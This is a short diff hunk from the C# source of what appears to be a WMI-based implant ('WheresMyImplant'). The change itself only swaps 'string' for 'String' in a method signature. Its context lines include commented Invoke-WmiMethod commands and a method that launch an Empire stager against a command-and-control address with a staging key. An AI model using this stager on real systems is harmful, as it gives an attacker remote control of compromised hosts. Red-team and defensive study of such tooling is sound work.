@@ -43,7 +43,7 @@ namespace WheresMyImplant
         [ManagementTask]
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
-        public static string Empire(string server, string stagingKey, string language)
+        public static String Empire(String server, String stagingKey, String language)
         {
            EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
            empireStager.execute();
